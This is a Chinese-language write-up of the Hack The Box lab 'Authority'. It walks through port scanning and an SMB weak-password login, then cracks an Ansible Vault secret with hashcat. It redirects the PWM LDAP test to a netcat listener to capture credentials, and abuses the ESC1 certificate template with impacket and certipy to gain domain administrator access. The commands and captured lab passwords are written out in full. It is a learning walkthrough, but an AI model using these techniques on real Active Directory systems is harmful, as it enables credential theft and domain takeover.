---
layout: post
title: HTB——Authority
---

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Authority/01.png?raw=true)

# 0x01 信息收集

```bash
 _____                             ___  _             
/__   \ ___   ___   __ _  _ __    / _ \| | _   _  ___ 
  / /\// __| / __| / _' || '_ \  / /_)/| || | | |/ __|
 / /   \__ \| (__ | (_| || | | |/ ___/ | || |_| |\__ \
 \/    |___/ \___| \__,_||_| |_|\/     |_| \__,_||___/

https://github.com/TideSec/TscanPlus
TscanClient Version: 2.7.4  NewVersion: 2.7.7  Expired: 2026.01.01
[08:11:35] [INFO] Start IpScan:10.129.182.214
[08:11:35] [INFO] 开始扫描 1 个主机的 65535 个端口，共 65535 个任务

[08:11:35] [+] 10.129.182.214:53 open                        
[08:11:35] [+] 10.129.182.214:139 open                       
[08:11:35] [+] 10.129.182.214:135 open
[08:11:35] [+] 10.129.182.214:80 open
[08:11:35] [+] 10.129.182.214:88 open
[08:11:35] [+] 10.129.182.214:464 open
[08:11:36] [+] 10.129.182.214:389 open
[08:11:36] [+] 10.129.182.214:445 open
端口扫描   0% [░░░░░░░░░░░░░░░░░░░░] (599/65535) [1s:1m49s][08:11:36] [+] 10.129.182.214:593 open
[08:11:36] [+] 10.129.182.214:636 open
[08:11:36] [+] [TCP/LDAP]  [Microsoft Windows Active Directory LDAP] 10.129.182.214:389 [0.d.0.0.domainFunctionality1.70.forestFunctionalit]
[08:11:36] [INFO] start LDAP check 10.129.182.214:389
[08:11:36] [+] 开始 LdapScan 任务: LDAP://10.129.182.214:389
[08:11:36] [+] [TCP/HTTP]  [([\d.]+)$| p 1.0] ncacn-http://10.129.182.214:593 [ncacn_http/1.0]
端口扫描   2% [░░░░░░░░░░░░░░░░░░░░] (1839/65535) [0s:17s][08:11:36] [+] [TCP/RPC]  [Microsoft Windows RPC] 10.129.182.214:135 [.@]                                                               
[08:11:36] [+] [TCP/NETBIOS]  [Microsoft Windows netbios-ssn] 10.129.182.214:139 [.]
[08:11:36] [INFO] start WMI check 10.129.182.214:135
[08:11:36] [+] 开始 WmiExec 任务: WMI://10.129.182.214:135
[08:11:36] [+] [TCP/HTTP] [200] [Microsoft-IIS/10.0] http://10.129.182.214:80 [IIS Windows Server]
[08:11:37] [+] 10.129.182.214:3269 open
[08:11:37] [+] 10.129.182.214:3268 open
端口扫描   8% [█░░░░░░░░░░░░░░░░░░░] (5497/65535) [1s:20s][08:11:38] [+] 10.129.182.214:5985 open
[08:11:39] [+] 10.129.182.214:8443 open                  
[08:11:39] [+] 10.129.182.214:9389 open
[08:11:40] [+] [TLS/HTTPS] [200]  https://10.129.182.214:8443 [None]
[08:11:40] [+] [TCP/KPASSWD5]   10.129.182.214:464 
[08:11:41] [+] [TCP/MICROSOFT-DS]   10.129.182.214:445    
[08:11:41] [INFO] start SMB check 10.129.182.214:445
[08:11:41] [+] 开始 SmbScan 任务: SMB://10.129.182.214:445
[08:11:41] [+] [TCP/LDAP]   10.129.182.214:3268 [0.a]
[08:11:41] [INFO] start LDAP check 10.129.182.214:3268     
[08:11:41] [+] 开始 LdapScan 任务: LDAP://10.129.182.214:3268
端口扫描  26% [█████░░░░░░░░░░░░░░░] (17308/65535) [0s:0s][08:11:43] [+] [TCP/SPARK]  [Apache Spark] 10.129.182.214:88 [.]                                                                        
[08:11:44] [+] [TCP/ADWS]   10.129.182.214:9389           
[08:11:45] [+] [TCP/HTTP] [404] [Microsoft-HTTPAPI/2.0][Microsoft HTTPAPI httpd 2.0] http://10.129.182.214:5985 [Not Found]
[08:11:45] [INFO] start WinRM check 10.129.182.214:5985
[08:11:45] [+] 开始 WinRMScan 任务: WinRM://10.129.182.214:5985
[08:11:50] [+] [TCP/LDAP]  [Microsoft Windows Active Directory LDAP] 10.129.182.214:3269 [0.d.0.0.domainFunctionality1.70.forestFunctionalit]                                                     
[08:11:50] [INFO] start LDAP check 10.129.182.214:3269
[08:11:50] [+] 开始 LdapScan 任务: LDAP://10.129.182.214:3269
[08:11:56] [+] [TCP/SSL]   10.129.182.214:636 [.G.M.h.0* a s s.oq mj;.%.4.C xi.w.z!.o.#_./.0.0.=.]
[08:11:56] [INFO] start LDAPS check 10.129.182.214:636
[08:11:56] [+] 开始 LdapsScan 任务: LDAPS://10.129.182.214:636
[08:11:56] [+] 10.129.182.214:47001 open
[08:11:57] [+] 10.129.182.214:49665 open
[08:11:57] [+] 10.129.182.214:49693 open
[08:11:57] [+] 10.129.182.214:49664 open
[08:11:57] [+] 10.129.182.214:49667 open                  
[08:11:57] [+] 10.129.182.214:49666 open
[08:11:57] [+] 10.129.182.214:49673 open
[08:11:57] [+] 10.129.182.214:49691 open                  
[08:11:57] [+] 10.129.182.214:49690 open
[08:11:57] [+] 10.129.182.214:49694 open
[08:11:57] [+] 10.129.182.214:49703 open                  
[08:11:57] [+] 10.129.182.214:49714 open                  
[08:11:58] [+] [TCP/HTTP]  [([\d.]+)$| p 1.0] ncacn-http://10.129.182.214:49690 [ncacn_http/1.0]
[08:12:02] [+] 10.129.182.214:57190 open                  
[08:12:03] [+] [TCP/HTTP] [404] [Microsoft-HTTPAPI/2.0][Microsoft HTTPAPI httpd 2.0] http://10.129.182.214:47001 [Not Found]
                                                          
[08:12:07] [+] alive ports is: 28
[08:12:07] [+] Ip扫描结束:10.129.182.214
[08:12:07] [INFO] Start UrlScan:http://10.129.182.214:80
https://10.129.182.214:84...
[08:12:07] [+] [TCP/HTTP] [404] [Microsoft-HTTPAPI/2.0] http://10.129.182.214:47001 [Not Found]
[08:12:07] [+] [TCP/HTTP] [404] [Microsoft-HTTPAPI/2.0] http://10.129.182.214:5985 [Not Found]
[08:12:07] [+] [TCP/HTTP] [200] [Microsoft-IIS/10.0] http://10.129.182.214:80 [IIS Windows Server]
[08:12:08] [+] [TLS/HTTPS] [200]  https://10.129.182.214:8443 [None]
                                                 
[08:12:08] [+] Url扫描结束:http://10.129.182.214:80
https://10.129.182.214:84...
[08:12:08] [+] 项目任务完成:Default, Timeuse：33.235624075
[08:12:08] [+] 扫描结束,耗时: 33.794142151s

┌──────────────────────────────────────────────┐
│    ___                              _        │
│   / _ \     ___  ___ _ __ __ _  ___| | __    │
│  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    │
│ / /_\\_____\__ \ (__| | | (_| | (__|   <     │
│ \____/     |___/\___|_|  \__,_|\___|_|\_\    │
└──────────────────────────────────────────────┘
      Fscan Version: 2.0.0

[2025-04-29 08:11:28] [INFO] 暴力破解线程数: 1
[2025-04-29 08:11:28] [INFO] 开始信息扫描
[2025-04-29 08:11:28] [INFO] 最终有效主机数量: 1
[2025-04-29 08:11:28] [INFO] 开始主机扫描
[2025-04-29 08:11:28] [INFO] 有效端口数量: 233
[2025-04-29 08:11:29] [SUCCESS] 端口开放 10.129.182.214:80
[2025-04-29 08:11:29] [SUCCESS] 端口开放 10.129.182.214:88
[2025-04-29 08:11:29] [SUCCESS] 端口开放 10.129.182.214:389
[2025-04-29 08:11:29] [SUCCESS] 端口开放 10.129.182.214:445
[2025-04-29 08:11:29] [SUCCESS] 端口开放 10.129.182.214:139
[2025-04-29 08:11:29] [SUCCESS] 端口开放 10.129.182.214:135
[2025-04-29 08:11:29] [SUCCESS] 端口开放 10.129.182.214:8443
[2025-04-29 08:11:34] [SUCCESS] 服务识别 10.129.182.214:88 => 
[2025-04-29 08:11:34] [SUCCESS] 服务识别 10.129.182.214:445 => 
[2025-04-29 08:11:34] [SUCCESS] 服务识别 10.129.182.214:139 =>  Banner:[.]
[2025-04-29 08:11:34] [SUCCESS] 服务识别 10.129.182.214:389 => 
[2025-04-29 08:11:34] [SUCCESS] 服务识别 10.129.182.214:80 => [http]
[2025-04-29 08:11:34] [SUCCESS] 服务识别 10.129.182.214:8443 => [http]
[2025-04-29 08:12:34] [SUCCESS] 服务识别 10.129.182.214:135 => 
[2025-04-29 08:12:34] [INFO] 存活端口数量: 7
[2025-04-29 08:12:34] [INFO] 开始漏洞扫描
[2025-04-29 08:12:34] [INFO] 加载的插件: findnet, ldap, ms17010, netbios, smb, smb2, smbghost, webpoc, webtitle                                                                                   
[2025-04-29 08:12:34] [SUCCESS] 网站标题 http://10.129.182.214     状态码:200 长度:703    标题:IIS Windows Server                                                                                 
[2025-04-29 08:12:35] [SUCCESS] NetInfo 扫描结果
目标主机: 10.129.182.214                                                                         
主机名: authority                                                                                
发现的网络接口:                                                                                  
   IPv4地址:                                                                                     
      └─ 10.129.182.214                                                                          
   IPv6地址:                                                                                     
      └─ dead:beef::2652:2a90:ea1a:dc28                                                          
      └─ dead:beef::1b7                                                                          
[2025-04-29 08:12:35] [SUCCESS] 网站标题 https://10.129.182.214:8443 状态码:200 长度:82     标题:无标题                                                                                           
[2025-04-29 08:13:12] [INFO] SMB2共享信息 10.129.182.214:445 admin Pass:123456 共享:[ADMIN$ C$ Department Shares Development IPC$ NETLOGON SYSVOL]                                                
[2025-04-29 08:13:17] [SUCCESS] SMB认证成功 10.129.182.214:445 admin:123456
```

典中典之SMB弱密码，直接开连看看有啥好东西。

```bash
┌──(root㉿kali)-[/home/kali/HTB/Authority]
└─# smbclient -L //10.129.182.214 -U admin                          
Password for [WORKGROUP\admin]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Department Shares Disk      
        Development     Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.182.214 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

先全部薅下来再说。再查看一下8443端口开放了什么服务，byd还必须要用https访问。观察源码可知搭建的服务为`PWM`

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Authority/02.png?raw=true)

---

# 0x02 ansible爆破密钥解密

在SMB获取的文件中的`PWM/Default/main.yml`中有`pwn_admin_password`，但是是加密过的。我们需要先将其薅出来，交由`ansible2john`来转换成可由`hashcat`爆破的格式。

- [Cracking Ansible Vault Secrets with Hashcat](https://www.bengrewell.com/cracking-ansible-vault-secrets-with-hashcat/)

首先我们手动去除内部缩进并转换格式

```bash
┌──(root㉿kali)-[/home/kali/HTB/Authority]
└─# ansible2john ansi.value > ansi.hash
ansi.value:$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5
```

然后将头部的`ansi.value`删除，交由hashcat爆破

```powershell
$ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c77635abc2ddc827ba0a1037e9d5*1dff07007e7a25e438e94de3f3e605e1*66cb125164f19fb8ed22809393b1767055a66deae678f4a8b1f8550905f70da5:!@#$%^&*

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 16900 (Ansible Vault)
Hash.Target......: $ansible$0*0*15c849c20c74562a25c925c3e5a4abafd392c7...f70da5
Time.Started.....: Tue Apr 29 14:16:21 2025 (0 secs)
Time.Estimated...: Tue Apr 29 14:16:21 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   357.6 kH/s (8.44ms) @ Accel:8 Loops:512 Thr:128 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 61440/14344386 (0.43%)
Rejected.........: 0/61440 (0.00%)
Restore.Point....: 0/14344386 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:9728-9999
Candidate.Engine.: Device Generator
Candidates.#1....: bulldogs -> single15
Hardware.Mon.#1..: Temp: 30c Util: 62% Core:1500MHz Mem:14001MHz Bus:8
```

拿到密码后我们就可以解密了。

```bash
┌──(root㉿kali)-[/home/kali/HTB/Authority]
└─# ansible-vault decrypt ansi.value
[WARNING]: You are running the development version of Ansible. You should only run Ansible from
"devel" if you are modifying the Ansible engine, or trying out features under development. This
is a rapidly changing source of code and can become unstable at any point.
Vault password: 
Decryption successful
//pWm_@dm!N_!23
```

---

# 0x03 检验ldap配置以获得NTLM

拿到后(注意我们的账户名&密码都是解密得到的`svc_pwm:pWm_@dm!N_!23`、LDAP的密码为`DevT3st@123`)，我们尝试登录服务器，发现登陆不上，但我们可以修改服务器的`config`。我们尝试增加`LDAP urls`中的一行为我们本机IP，端口设定为默认的389端口，并在本地开启监听后，服务器上点击测试`test ldap profile`，我们本地就会收到此测试账户的LDAP信息，其中就包括了`svc_ldap`的账密。

```bash
┌──(root㉿kali)-[/home/kali]
└─# nc -lvnp 389        
listening on [any] 389 ...
connect to [10.10.16.10] from (UNKNOWN) [10.129.182.214] 62654
0Y`T;CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb�lDaP_1n_th3_cle4r!0P
```

我们使用此账户通过winrm登录即可获取账号密码了。

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Authority/03.png?raw=true)

---

# 0x04 ESC1

拿下后，根据问题我们使用`certipy-ad`查看可能有漏洞的证书模板。

```txt
  1
    Template Name                       : CorpVPN
    Display Name                        : Corp VPN
    Certificate Authorities             : AUTHORITY-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : AutoEnrollmentCheckUserDsCertificate
                                          PublishToDs
                                          IncludeSymmetricAlgorithms
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Encrypting File System
                                          Secure Email
                                          Client Authentication
                                          Document Signing
                                          IP security IKE intermediate
                                          IP security use
                                          KDC Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Validity Period                     : 20 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Permissions
        Enrollment Rights               : AUTHORITY.HTB\Domain Computers
                                          AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : AUTHORITY.HTB\Administrator
        Write Owner Principals          : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
        Write Dacl Principals           : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
        Write Property Principals       : AUTHORITY.HTB\Domain Admins
                                          AUTHORITY.HTB\Enterprise Admins
                                          AUTHORITY.HTB\Administrator
    [!] Vulnerabilities
      ESC1                              : 'AUTHORITY.HTB\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
```

查找到了ESC1漏洞，可被`AUTHORITY.HTB\Domain Computers`利用。我们先将CA与主机DNS解析记录加到`hosts`文件中，再利用ESC1获取到pfx文件。首先我们查询拥有的账户是否还有创建机器账户的权限。

```bash
┌──(root㉿kali)-[/home/kali/HTB/Authority]
└─# netexec ldap 10.129.182.214 -u svc_ldap -p 'lDaP_1n_th3_cle4r!' -M maq
SMB         10.129.182.214  445    AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 x64 (name:AUTHORITY) (domain:authority.htb) (signing:True) (SMBv1:False)
LDAPS       10.129.182.214  636    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r!
MAQ         10.129.182.214  389    AUTHORITY        [*] Getting the MachineAccountQuota
MAQ         10.129.182.214  389    AUTHORITY        MachineAccountQuota: 10
```

那我们先尝试使用此账户创建一个新的机器账户，再用此机器账户去打ESC1

```bash
┌──(root㉿kali)-[/home/kali/HTB/Authority]
└─# impacket-addcomputer authority.htb/'svc_ldap':'lDaP_1n_th3_cle4r!' -computer-name 'gailo$' -computer-pass 'password!@#45' -dc-ip 10.129.182.214
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account gailo$ with password password!@#45.

┌──(root㉿kali)-[/home/kali/HTB/Authority]
└─# certipy-ad req -username 'gailo$'@authority.htb -password 'password!@#45' -target-ip authority.authority.htb -ca 'AUTHORITY-CA' -template 'CorpVPN' -upn 'administrator@authority.htb'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 6
[*] Got certificate with UPN 'administrator@authority.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

但是在使用`Certipy-ad`对此pfx认证获取NTLM时会报`KDC_ERR_PADATA_TYPE_NOSUPP`错误

- [KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type) [Need Urgent Help\] · Issue #205 · ly4k/Certipy](https://github.com/ly4k/Certipy/issues/205)

查询可知是因为AD CS服务器不支持PKINIT认证导致的此问题。我们尝试进入`-ldap-shell`来在内添加账号并提权至`Administrators`组

```bash
┌──(root㉿kali)-[/home/kali/HTB/Authority]
└─# certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.182.214 -ldap-shell
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Connecting to 'ldaps://10.129.182.214:636'
[*] Authenticated to '10.129.182.214' as: u:HTB\Administrator
Type help for list of commands
# add_user lincoke
Attempting to create user in: %s CN=Users,DC=authority,DC=htb
Adding new user with username: lincoke and password: Xhr|M@WDFaPY22o result: OK

# add_user_to_group lincoke Administrators
Adding user: lincoke to group Administrators result: OK
```

然后我们使用`evil-winrm`登录，就可以获取`root.txt`辣

![Alt text](https://github.com/Jackie1732/Jackie1732.github.io/blob/main/pictures/Authority/04.png?raw=true)